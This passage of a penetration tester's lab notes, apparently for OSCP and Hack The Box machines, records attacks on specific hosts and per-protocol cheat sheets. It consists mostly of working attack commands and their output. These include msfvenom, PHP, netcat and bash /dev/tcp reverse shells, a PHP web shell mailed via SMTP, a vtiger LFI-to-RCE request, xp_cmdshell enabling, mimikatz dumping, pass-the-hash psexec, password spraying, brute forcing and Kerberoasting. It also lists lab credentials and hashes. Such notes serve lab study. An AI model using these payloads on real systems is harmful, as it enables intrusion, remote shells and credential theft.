Server 2012                       11.0.2100.60     Microsoft VSS Writer for SQL Server 2012                      <br /><br /><br /><br />-----------------------------------------------------------<br /> Installed Patches<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> Program Folders<br />-----------------------------------------------------------<br /><br /><br />C:\Program Files<br />-------------<br />Common Files                <br />Internet Explorer           <br />Microsoft SQL Server        <br />Microsoft Visual Studio 10.0<br />Microsoft.NET               <br />MSBuild                     <br />Reference Assemblies        <br />TightVNC                    <br />VMware                      <br />Windows Mail                <br />Windows NT                  <br />WindowsPowerShell           <br /><br /><br />C:\Program Files (x86)<br />-------------------<br />Common Files        <br />Internet Explorer   <br />Microsoft SQL Server<br />Microsoft.NET       <br />MSBuild             <br />Reference Assemblies<br />Windows Mail        <br />Windows NT          <br />WindowsPowerShell   <br /><br /><br /><br />-----------------------------------------------------------<br /> Files with Full Control and Modify Access<br />-----------------------------------------------------------<br /><br />C:\inetpub\wwwroot\cannon.txt<br /><br /><br /><br />C:\Program Files\Microsoft SQL Server\140\Setup Bootstrap\Log\20190407_121805\DotNet46_Cpu64_1.log.html<br /><br /><br /><br />C:\Users\Public\Documents\cannon.txt<br /><br /><br />-----------------------------------------------------------<br /> Folders with Full Control and Modify Access<br />-----------------------------------------------------------<br /><br />Failed to read more folders<br /><br />Failed to read more folders<br /><br />Failed to read more folders<br /><br />Failed to read more folders<br /><br />Failed to read more folders<br /><br />-----------------------------------------------------------<br /> Mapped Drives<br />-----------------------------------------------------------<br /><br />C:                 <br />D:                 <br /><br /><br />-----------------------------------------------------------<br /> Unquoted Service Paths<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> Recent Documents<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> Potentially Interesting Files in Users Directory <br />-----------------------------------------------------------<br />C:\Users\Public\Documents\cannon.txt<br /><br />-----------------------------------------------------------<br /> 10 Last Modified Files in C:\User<br />-----------------------------------------------------------<br />C:\Users\Administrator<br />C:\Users\MSSQL$SQLEXPRESS<br />C:\Users\SQLTELEMETRY$SQLEXPRESS<br />C:\Users\Classic .NET AppPool<br />C:\Users\.NET v2.0 Classic<br />C:\Users\.NET v2.0<br />C:\Users\.NET v4.5 Classic<br />C:\Users\.NET v4.5<br />C:\Users\Public\Documents<br />C:\Users\Public\Documents\cannon.txt<br /><br />-----------------------------------------------------------<br /> MUICache Files<br />-----------------------------------------------------------<br /><br /><br />-----------------------------------------------------------<br /> System Files with Passwords<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> AlwaysInstalledElevated Registry Key<br />-----------------------------------------------------------<br /><br />-----------------------------------------------------------<br /> Stored Credentials<br />-----------------------------------------------------------<br /><br />Currently stored credentials:<br /><br />* NONE *<br /><br />-----------------------------------------------------------<br /> Checking for AutoAdminLogon <br />-----------------------------------------------------------<br /><br /><br />  Command:</div><div class='page'><h1 class='title level-3'>Pictures</h1><br/><a href=""><img src="images/918-1.png" alt="images/918-1.png" /></a><br /><br /><a href=""><img src="images/918-2.png" alt="images/918-2.png" /></a><br /><br /><a href=""><img src="images/918-3.png" alt="images/918-3.png" /></a><br /><br /><a href=""><img src="images/918-4.png" alt="images/918-4.png" /></a><br /><br /><a href=""><img src="images/918-5.png" alt="images/918-5.png" /></a><br /><br /><a href=""><img src="images/918-6.png" alt="images/918-6.png" /></a><br /><br /><a href=""><img src="images/918-7.png" alt="images/918-7.png" /></a><br /><br /><a href=""><img src="images/918-8.png" alt="images/918-8.png" /></a><br /><br /></div><div class='page'><h1 class='title level-2'>10.11.1.14 Bob</h1><br/>Nmap showed that ports 21, 23, 25, 80, 110, 220, and 443 were open.<br />FTP anonymous was enabled.<br />Chris verified that he could upload files to the wwwroot directory on the ftp server.<br />wwwroot is also the webroot for port 80.<br />He used msfvenom to craft code that when executed would give him a reverse shell.<br />msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.167 lport=80 -f asp -a x86 --platform win  &gt; shell.asp<br />During enumeration using accecsschk.exe he found that he could edit the service upnphost and then run it.<br />He edited the binpath to create a reverse shell via nc when started.<br />He started the service and gained a new reverse shell as nt authority\system.<br /><br /><br /><br /><br /><br /><br />a26f37da4583ff68f44d133d12ae3459</div><div class='page'><h1 class='title level-3'>enumeration</h1><br/>iis5.1 = xp pro</div><div class='page'><h1 class='title level-4'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.11.1.14 &amp;&amp; nmap -sC -sV -Pn 10.11.1.14 &amp;&amp; nmap -p- -Pn 10.11.1.14<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-27 13:27 EDT<br />Nmap scan report for 10.11.1.14<br />Host is up (0.072s latency).<br />Not shown: 994 filtered ports<br />PORT    STATE  SERVICE<br />21/tcp  open   ftp<br />23/tcp  closed telnet<br />25/tcp  closed smtp<br />80/tcp  open   http<br />110/tcp closed pop3<br />443/tcp open   https<br /><br />Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-27 13:27 EDT<br />Nmap scan report for 10.11.1.14<br />Host is up (0.081s latency).<br />Not shown: 994 filtered ports<br />PORT    STATE  SERVICE VERSION<br />21/tcp  open   ftp     Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| 04-26-20  01:45PM               331888 accesschk-2003-xp.exe<br />| 04-26-20  02:16PM       &lt;DIR&gt;          AdminScripts<br />| 01-17-07  07:43PM       &lt;DIR&gt;          ftproot<br />| 01-17-07  07:43PM       &lt;DIR&gt;          iissamples<br />| 04-26-20  03:20PM               983816 mimikatz.exe<br />| 04-26-20  02:48PM                59392 nc.exe<br />| 04-26-20  02:18PM       &lt;DIR&gt;          Scripts<br />| 04-26-20  02:07PM                66560 whoami.exe<br />|_04-27-20  01:54PM       &lt;DIR&gt;          wwwroot<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />23/tcp  closed telnet<br />25/tcp  closed smtp<br />80/tcp  open   http    Microsoft IIS httpd 5.1<br />| http-methods: <br />|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT<br />|_http-server-header: Microsoft-IIS/5.1<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />| http-webdav-scan: <br />|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH<br />|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK<br />|   Server Type: Microsoft-IIS/5.1<br />|   Server Date: Mon, 27 Apr 2020 17:26:31 GMT<br />|_  WebDAV type: Unknown<br />110/tcp closed pop3<br />443/tcp open   https?<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 109.14 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-27 13:29 EDT<br />Nmap scan report for 10.11.1.14<br />Host is up (0.065s latency).<br />Not shown: 65528 filtered ports<br />PORT    STATE  SERVICE<br />21/tcp  open   ftp<br />23/tcp  closed telnet<br />25/tcp  closed smtp<br />80/tcp  open   http<br />110/tcp closed pop3<br />220/tcp closed imap3<br />443/tcp open   https<br /><br />Nmap done: 1 IP address (1 host up) scanned in 107.57 seconds<br /></div><div class='page'><h1 class='title level-4'>web</h1><br/></div><div class='page'><h1 class='title level-5'>80</h1><br/>PORT   STATE SERVICE    REASON  VERSION<br />80/tcp open  tcpwrapped syn-ack<br />|_http-server-header: Microsoft-IIS/5.1<br /><br /><br /></div><div class='page'><h1 class='title level-5'>443</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>PORT    STATE SERVICE    REASON  VERSION<br />443/tcp open  tcpwrapped syn-ack<br /></div><div class='page'><h1 class='title level-4'>systeminfo</h1><br/>Host Name:                 BOB<br />OS Name:                   Microsoft Windows XP Professional<br />OS Version:                5.1.2600 Service Pack 1 Build 2600<br />OS Manufacturer:           Microsoft Corporation<br />OS Configuration:          Standalone Workstation<br />OS Build Type:             Uniprocessor Free<br />Registered Owner:          Offsec<br />Registered Organization:   Offsec<br />Product ID:                55274-640-9771731-23056<br />Original Install Date:     1/10/2007, 5:49:26 PM<br />System Up Time:            N/A<br />System Manufacturer:       VMware, Inc.<br />System Model:              VMware Virtual Platform<br />System type:               X86-based PC<br />Processor(s):              1 Processor(s) Installed.<br />                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz<br />BIOS Version:              INTEL  - 6040000<br />Windows Directory:         C:\WINDOWS<br />System Directory:          C:\WINDOWS\System32<br />Boot Device:               \Device\HarddiskVolume1<br />System Locale:             en-us;English (United States)<br />Input Locale:              en-us;English (United States)<br />Time Zone:                 (GMT) Greenwich Mean Time : Dublin, Edinburgh, Lisbon, London<br />Total Physical Memory:     511 MB<br />Available Physical Memory: 253 MB<br />Virtual Memory: Max Size:  1,378 MB<br />Virtual Memory: Available: 900 MB<br />Virtual Memory: In Use:    478 MB<br />Page File Location(s):     C:\pagefile.sys<br />Domain:                    WORKGROUP<br />Logon Server:              N/A<br />Hotfix(s):                 3 Hotfix(s) Installed.<br />                           [01]: File 1<br />                           [02]: Q147222<br />                           [03]: KB893803v2 - Update<br />NetWork Card(s):           1 NIC(s) Installed.<br />                           [01]: VMware PCI Ethernet Adapter<br />                                 Connection Name: Ethernet0<br />                                 DHCP Enabled:    No<br />                                 IP address(es)<br />                                 [01]: 10.11.1.14<br /></div><div class='page'><h1 class='title level-3'>pictures</h1><br/><a href=""><img src="images/927-1.png" alt="images/927-1.png" /></a><br /><br /><a href=""><img src="images/927-2.png" alt="images/927-2.png" /></a><br /><br /><a href=""><img src="images/927-3.png" alt="images/927-3.png" /></a><br /><br /><a href=""><img src="images/927-4.png" alt="images/927-4.png" /></a><br /><br /><a href=""><img src="images/927-5.png" alt="images/927-5.png" /></a><br /><a href=""><img src="images/927-6.png" alt="images/927-6.png" /></a><br /><br /><a href=""><img src="images/927-7.png" alt="images/927-7.png" /></a><br /><br /><a href=""><img src="images/927-8.png" alt="images/927-8.png" /></a></div><div class='page'><h1 class='title level-2'>10.11.1.20 SV-DC01</h1><br/>SVCORP-<br />Began enumeration on .20 externally via TmuxRecon. <br />There were no obvious avenues of attack so I moved on to .21.<br />Enumeration with TmuxRecon showed that there was an open web server which was hosting an html document giving the creds editor and MyEditWork to an FTP server on the same box.<br />After creating a .docm file with a rev shell macro, I uploaded it to the FTP server on .21 hoping that someone would open it and accept the macro.<br />I then got a rev shell to .22 as the local administrator alice in a medium integrity shell. <br />I used Akagi.exe 23 to turn that into a high integrity Shell.<br />I then used mimikatz sekurlsa to dump the logon passwords which gave me the cleartext password for alice, ThisIsTheUsersPassword01.<br />I then used Spray-Passwords.ps1 to guess passwords that were following the same pattern. By matter of chance, the numbers matched the order of how the users were in LDAP. ThisIsTheUsersPassword20 for adam ended up being pretty useful.<br />I then used psexec.py to use adams credentials to log on to .21. I then used mimikatz to dump the logonpasswords and wdigest. This got me the hash of tris.<br />I used psexec.py and tris&#39;s creds to log on to .20. <br />	psexec.py svcorp/tris@10.11.1.20 -hashes aad3b435b51404eeaad3b435b51404ee0:8df3c73ded940e1f2bcf5eea4b8dbf6 -dc-ip 10.11.1.20 <br />net use showed me that the admins were broken into &#39;Server Admins&#39; and &#39;Workstation Admins&#39;. I changed the password of pete (workstation admins) to Fr33d0M32. I then RDP&#39;d in as him and collected the last proof!<br /> <br /> </div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/></div><div class='page'><h1 class='title level-3'>Pictures</h1><br/></div><div class='page'><h1 class='title level-3'>10.11.1.21 SV-FILE01</h1><br/></div><div class='page'><h1 class='title level-4'>Enumeration</h1><br/></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/></div><div class='page'><h1 class='title level-3'>10.11.1.22</h1><br/></div><div class='page'><h1 class='title level-4'>Enumeration</h1><br/></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/></div><div class='page'><h1 class='title level-3'>10.11.1.24</h1><br/>c5b1ecf9efac134537f83127050836d5</div><div class='page'><h1 class='title level-4'>Enumeration</h1><br/>svclient73.svcorp.com<br /><br />e775d4b0406a485ebe5fdc9fc399870d</div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1782-1.png" alt="images/1782-1.png" /></a></div><div class='page'><h1 class='title level-2'>10.11.1.31 Ralph</h1><br/></div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/>bankdb<br />sa:poiuytrewq<br /><br /><br /><br /><br />	&#39;advanced&#39; turn it back on<br />    EXEC SP_CONFIGURE &#39;show advanced options&#39;, 1<br />    reconfigure<br />    go<br />    EXEC SP_CONFIGURE &#39;xp_cmdshell&#39; , 1<br />    reconfigure<br />    go<br />    xp_cmdshell &#39;whoami&#39;<br />    go</div><div class='page'><h1 class='title level-3'>Pictures</h1><br/><a href=""><img src="images/1785-1.png" alt="images/1785-1.png" /></a><br /><br />7eab8563146f16140c769072580cbcb3</div><div class='page'><h1 class='title level-2'>10.11.1.251 Sean</h1><br/>wpscan with rockyou for password on default wordpress account. admin:monkey<br />ssh in as user seen on wp site sean sean:monkey<br />sudo bash = root</div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/>20/tcp    closed ftp-data                   <br />21/tcp    open   ftp                                                                              <br />22/tcp    open   ssh    <br />80/tcp    open   http                                                                             <br />10180/tcp closed unknown<br /><br />admin might be a username?<br /><br />wordpress /wp/<br /><br /><br />admin:monkey<br /><br />$sock=fsockopen(&quot;10.0.0.1&quot;,4242);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);</div><div class='page'><h1 class='title level-3'>Pictures</h1><br/>ff3e57a673fc3159a4cc5df91e5c543d<br />7eab8563146f16140c769072580cbcb3<br /><br /><a href=""><img src="images/1864-1.png" alt="images/1864-1.png" /></a></div><div class='page'><h1 class='title level-2'>Template</h1><br/></div><div class='page'><h1 class='title level-3'>Enumeration</h1><br/></div><div class='page'><h1 class='title level-3'>Pictures</h1><br/></div><div class='page'><h1 class='title level-1'>10.1.1.89 MVUA007</h1><br/>OFFSEC SAYS MACHINE MAY BE BROKEN<br /><br /><br />REMOTEM****</div><div class='page'><h1 class='title level-2'>Enumeration</h1><br/>[*] Windows 10 Pro 15063 x64 (name:DESKTOP-MVUAOO7) (domain:DESKTOP-MVUAOO7) (signing:False) (SMBv1:True)<br /><br /><br />SMB-no rights<br />FTP-project.zip (project = laravel) (There is an RCE for a version of laravel)<br /><br /><br /><br /><br /><br />PORT     STATE SERVICE    VERSION<br />21/tcp   open  tcpwrapped<br />80/tcp   open  tcpwrapped<br />135/tcp  open  tcpwrapped<br />139/tcp  open  tcpwrapped<br />445/tcp  open  tcpwrapped<br />8090/tcp open  tcpwrapped<br /><br /><br /><br />laravel<br />const VERSION = &#39;7.18.0&#39;;<br /><br /><br /><br />exacq for pe probably</div><div class='page'><h1 class='title level-2'>Pictures</h1><br/></div><div class='page'><h1 class='title level-1'>10.1.1.95 TheLongNight</h1><br/></div><div class='page'><h1 class='title level-2'>Enumeration</h1><br/>PORT    STATE  SERVICE VERSION<br />22/tcp  open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 a9:f8:86:0a:d3:84:02:8e:5b:39:10:02:b7:da:a6:fe (RSA)<br />|   256 43:20:17:22:a0:f4:59:50:7f:d7:f4:ed:f0:8c:ba:f4 (ECDSA)<br />|_  256 0f:09:8b:2e:a4:15:f7:e1:a6:22:72:5f:90:2e:33:c2 (ED25519)<br />25/tcp  open   smtp    Postfix smtpd<br />|_smtp-commands: thelongnight.oscp, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, <br />80/tcp  open   http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Bare - Start Bootstrap Template<br />81/tcp  open   http    Apache httpd 2.4.18<br />110/tcp open   pop3    Dovecot pop3d<br />|_pop3-capabilities: TOP CAPA UIDL AUTH-RESP-CODE SASL PIPELINING RESP-CODES<br />143/tcp open  imap    Dovecot imapd<br />443/tcp closed https<br />Service Info: Hosts:  thelongnight.oscp, thelongnight.oscp; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 118.04 seconds<br /><br /><br /><br /><br /><br /><br /><br /><br />web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)<br />web application technology: Apache 2.4.18<br />back-end DBMS: MySQL &gt;= 5.1<br /><br />table &#39;events&#39; in database &#39;calendar<br /><br /><br />rm -f /tmp/f; mkfifo /tmp/f &amp;&amp; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.1.1.246 25 &gt; /tmp/f</div><div class='page'><h1 class='title level-2'>Pictures</h1><br/></div><div class='page'><h1 class='title level-1'>Protocols</h1><br/><br /></div><div class='page'><h1 class='title level-2'>ftp</h1><br/>ftp 10.11.1.8<br />Anonymous<br />-bi     &lt;&lt;&lt; so that your put is done via binary<br /><br />wget --mirror &#39;ftp://ftp_user:UTDRSCH53c&quot;$6hys@10.10.10.59&#39;<br />^^to download all dirs and files<br /><br />wget --no-passive-ftp --mirror &#39;<a href="ftp://anonymous:anonymous@10.10.10.98'">ftp://anonymous:anonymous@10.10.10.98&#39;</a> <br />if PASV transfer is disabled<br /><br />??are you in a users dir??<br />mkdir .ssh<br />    --on kali-- <br />        ssh-keygen<br />        enter, enter, enter<br />        cd .ssh<br />        cp id_rsa.pub authorized_keys<br />cd .ssh<br />put authorized_keys<br />!!!now you can ssh as the user who&#39;s directory you were in!!!</div><div class='page'><h1 class='title level-3'>FTP FIle Movment</h1><br/>python3 -m pip install pyftpdlib<br /><br />python3 -m pyftpdlib -p 21<br /><br /><br /><br />echo open 10.10.14.60&gt;ftp_commands.txt&amp;echo anonymous&gt;&gt;ftp_commands.txt&amp;echo password&gt;&gt;ftp_commands.txt&amp;echo binary&gt;&gt;ftp_commands.txt&amp;echo get ms15051.exe&gt;&gt;ftp_commands.txt&amp;echo bye&gt;&gt;ftp_commands.txt&amp;ftp -s:ftp_commands.txt<br /><br />echo open 10.9.0.59&gt;ftp_commands.txt&amp;echo anonymous&gt;&gt;ftp_commands.txt&amp;echo password&gt;&gt;ftp_commands.txt&amp;echo binary&gt;&gt;ftp_commands.txt&amp;echo put windows_dll.c&gt;&gt;ftp_commands.txt&amp;echo bye&gt;&gt;ftp_commands.txt&amp;ftp -s:ftp_commands.txt</div><div class='page'><h1 class='title level-2'>ssh</h1><br/>Authentication techniques-<br />	password<br />	private key of target<br />	Your public key written to /home/tony/.ssh/authorized_keys <br />	CA and CA.pub (signed private key with a “public key cert” and “public key” in the same dir.)<br /><br /><br />have you&gt;&gt;&gt;???...<br />used leaked data to find machine version, patch level and patch date<br />used hydra to brute force<br />used cewl to create a brute force password/user list?<br /><br />??are you in a users dir??<br />mkdir .ssh<br />    --on kali-- <br />        ssh-keygen<br />        enter, enter, enter<br />        cd .ssh<br />        cp id_rsa.pub authorized_keys<br />cd .ssh<br />put authorized_keys<br />!!!now you can ssh as the user who&#39;s directory you were in!!!<br /><br />-----------------------------------------------------------------------------------------------------------------------------------<br />ssh proxy<br />ssh -L 5601:127.0.0.1:5601 security@10.10.10.115<br /><br />-----------------------------------------------------------------------------------------------------------------------------------<br />ssh -i /root/path/id_rsa gilfoyle@10.10.10.110        &lt;&lt;&lt;&lt;login with private key<br /><br /></div><div class='page'><h1 class='title level-3'>cewl</h1><br/>cewl -d 2 -m 5 -w cewlwords.txt <a href="http://dc-2/">http://dc-2/</a><br /></div><div class='page'><h1 class='title level-3'>hydra</h1><br/>hydra -l charles -P /root/Desktop/Tools/Wordlists/rockyou.txt -t 6 ssh://192.168.11.129<br /><br />^^big L for a list of users, little l for a single name. Same with password P for a list, p for just a password</div><div class='page'><h1 class='title level-3'>PrivEsc</h1><br/><br />Be sure to view /etc/ssh/sshd_config<br />    AuthorizedKeysCommands you will be able to run!<br />    <br />    <br />    <br />    <br />    <br />    <br /></div><div class='page'><h1 class='title level-4'>ca</h1><br/>Psermon from Ghandi    <br />As we have the root user’s principal, we can generate SSH keys and sign them with root’s principal. Doing so will allow us to login through SSH as root. Now we know we can run ssh-keygen to generate SSH keys but first, we need a certificate to sign the SSH key. We enumerate the machine to find a certificate and find one inside /home/userca directory.<br />-------------<br />-You are looking for a ca and ca.pub file<br />--------------<br /><br />First, we generate SSH keys and move them into the /tmp directory. Then we sign the keys as userca to read the certificate inside /home/userca/ca.<br />----------------<br />ssh-keygen<br />mv .ssh/id_rsa* /tmp/<br />doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I root /tmp/id_rsa.pub<br />                                                        ^location of ca file    ^principal               ^username to principal^location<br />-----------------<br /><br />After signing the RSA keys, we use the RSA key to login through SSH as the root user. After logging in we find a file called “root.txt”. We take a look inside the content of the file and find the final flag.<br /><br />ssh -i /tmp/id_rsa root@localhost<br /><br /><a href="https://www.hackingarticles.in/hack-the-box-ypuffy-walkthrough/">https://www.hackingarticles.in/hack-the-box-ypuffy-walkthrough/</a><br /><br /><br />In my own words<br />you can sign in with a password (pulic key auth), <br />private key (other side of public key auth) or a <br />signed private key with a “public key cert” and “public key” in the same dir. </div><div class='page'><h1 class='title level-3'>no matching key exchange</h1><br/><a href=""><img src="images/1066-1.png" alt="images/1066-1.png" /></a><br /><br />ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 alice@10.11.1.141<br /></div><div class='page'><h1 class='title level-3'>Install OpenSSH Windows</h1><br/><a href="https://github.com/PowerShell/Win32-OpenSSH/wiki/Install-Win32-OpenSSH#install-win32-openssh-test-release">https://github.com/PowerShell/Win32-OpenSSH/wiki/Install-Win32-OpenSSH#install-win32-openssh-test-release</a></div><div class='page'><h1 class='title level-2'>telnet</h1><br/>wireshark to hear creds being passed<br />tcp.port == 23 and ip.addr != myip</div><div class='page'><h1 class='title level-2'>smtp</h1><br/></div><div class='page'><h1 class='title level-3'>burp</h1><br/>IN BURP<br />in repeater replace GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action HTTP/1.1<br />with GET /vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&amp;module=Accounts&amp;action HTTP/1.1<br />to verify code execution after &amp;action put &amp;squid=whoami           run it in repeater. this should return asterisk<br />right click &gt; change execution method<br />at the end add execution &amp;squid=bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1<br />highlight bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1 and hit &quot;control u&quot; to encode in url. should look like    bash+-i+&gt;%26+/dev/tcp/10.10.14.60/3232+0&gt;%261<br />in terminal<br />    nc -lvnp 3232<br />in burp<br />    run<br />in terminal<br />    observe your new shell!!<br />other terminal<br />    searchsploit -x exploits/php/webapps/18650.py (found by searchsploit elastix)<br />in terminal<br />listening on [any] 3232 ...<br />connect to [10.10.14.60] from (UNKNOWN) [10.10.10.7] 49037<br />bash: no job control in this shell<br />bash-3.2$ id<br />uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)<br />bash-3.2$ whoami<br />asterisk<br />bash-3.2$ sudo nmap --interactive<br /><br />Starting Nmap V. 4.11 ( <a href="http://www.insecure.org/nmap/">http://www.insecure.org/nmap/</a> )<br />Welcome to Interactive Mode -- press h &lt;enter&gt; for help<br />nmap&gt; whoami<br />Unknown command (whoami) -- press h &lt;enter&gt; for help<br />nmap&gt; !sh<br />id<br />uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</div><div class='page'><h1 class='title level-3'>connect</h1><br/>root@kali:~# telnet 10.10.10.7 25<br />Trying 10.10.10.7...<br />Connected to 10.10.10.7.<br />Escape character is &#39;^]&#39;.<br />220 beep.localdomain ESMTP Postfix<br />EHLO coolhandsquid.au<br />250-beep.localdomain<br />250-PIPELINING<br />250-SIZE 10240000<br />250-VRFY<br />250-ETRN<br />250-ENHANCEDSTATUSCODES<br />250-8BITMIME<br />250 DSN<br />VRFY asterisk@localhost  <br />252 2.0.0 asterisk@localhost<br />mail from:coolhandsquid@step-child.au<br />250 2.1.0 Ok<br />rcpt to:asterisk@localhost<br />250 2.1.5 Ok<br />data<br />354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br />Subject: You got owned<br />&lt;?php echo system($_REQUEST[&#39;squid&#39;]); ?&gt;<br /><br />.<br />250 2.0.0 Ok: queued as 84C50D92F8<br />^C<br />^]<br />telnet&gt; quit<br />Connection closed.</div><div class='page'><h1 class='title level-2'>dns</h1><br/>root@kali:~/Desktop/Machines/HTB/Bank# nslookup<br />&gt; SERVER 10.10.10.29<br />Default server: 10.10.10.29<br />Address: 10.10.10.29#53<br />&gt; 127.0.0.1<br />1.0.0.127.in-addr.arpa	name = localhost.<br />&gt; 10.10.10.29<br />** server can&#39;t find 29.10.10.10.in-addr.arpa: NXDOMAIN<br />&gt; bank.htb<br />Server:		10.10.10.29<br />Address:	10.10.10.29#53<br /><br />Name:	bank.htb<br />Address: 10.10.10.29<br /><br />dnsrecon -r 127.0.0.0/24 -n 10.10.10.29<br />dnsrecon -r 127.0.1.0/24 -n 10.10.10.29<br />dnsrecon -r 10.10.10.0/24 -n 10.10.10.29<br /><br />root@kali:~/Desktop/Machines/HTB/Bank# dig axfr @10.10.10.29<br /><br />; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.29<br />; (1 server found)<br />;; global options: +cmd<br />;; Query time: 154 msec<br />;; SERVER: 10.10.10.29#53(10.10.10.29)<br />;; WHEN: Sat Jul 20 12:18:47 EDT 2019<br />;; MSG SIZE  rcvd: 28<br /><br />root@kali:~/Desktop/Machines/HTB/Bank# dig axfr bank.htb @10.10.10.29                       &lt;&lt;&lt;&lt;When adding to tirefire, check for all domain names<br /><br />; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr bank.htb @10.10.10.29<br />;; global options: +cmd<br />bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800<br />bank.htb.		604800	IN	NS	ns.bank.htb.<br />bank.htb.		604800	IN	A	10.10.10.29<br />ns.bank.htb.		604800	IN	A	10.10.10.29<br /><a href="http://www.bank.htb.">www.bank.htb.		604800	IN	CNAME	bank.htb.</a><br />bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800<br />;; Query time: 152 msec<br />;; SERVER: 10.10.10.29#53(10.10.10.29)<br />;; WHEN: Sat Jul 20 12:19:03 EDT 2019<br />;; XFR size: 6 records (messages 1, bytes 171)<br /><br />------------------------------------------------------------------------------------<br />nano /etc/resolv.conf<br /># Generated by NetworkManager<br />search localdomain<br />nameserver 10.10.10.29<br />nameserver 192.168.163.2<br />-------------------------------------------------------------------------------------<br />can navigate to bank.htb now!!</div><div class='page'><h1 class='title level-2'>kerberos</h1><br/>python /root/Desktop/Tools/kerbrute/kerbrute.py -user svc-alfresco -passwords /root/Desktop/Tools/Wordlists/rockyou.txt -domain HTB -dc-ip 10.10.10.161<br /><br />python2 /root/Desktop/Tools/ridenum/ridenum.py 10.10.10.161 500 50000 /root/Desktop/Tools/Wordlists/rockyou.txt users.txt           &lt;&lt;users.txt is self generated from list of found users<br /><br /><br /><a href="https://evilwing.me/2019/07/02/kerberos-cheatsheet/">https://evilwing.me/2019/07/02/kerberos-cheatsheet/</a><br /><br />n<code>map -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;htb.local&#39;,userdb=/usr/share/seclists/Usernames/Names/names.txt 10.10.10.52</code><br />^^^^^^^^^^^^^^^^^^^^^^^^<br />need to know domain name</div><div class='page'><h1 class='title level-3'>Pre-creds</h1><br/>n<code>map -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;htb.local&#39;,userdb=/usr/share/seclists/Usernames/Names/names.txt 10.10.10.52</code><br />^^^^^^^^^^^^^^^^^^^^^^^^<br />need to know domain name</div><div class='page'><h1 class='title level-3'>with user/s</h1><br/>python /root/Desktop/Tools/kerbrute/kerbrute.py -user svc-alfresco -passwords /root/Desktop/Tools/Wordlists/rockyou.txt -domain HTB -dc-ip 10.10.10.161<br /><br />python2 /root/Desktop/Tools/ridenum/ridenum.py 10.10.10.161 500 50000 /root/Desktop/Tools/Wordlists/rockyou.txt users.txt           &lt;&lt;users.txt is self generated from list of found users</div><div class='page'><h1 class='title level-3'>post-creds</h1><br/>kerberROAST!!<br />GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs</div><div class='page'><h1 class='title level-2'>ident 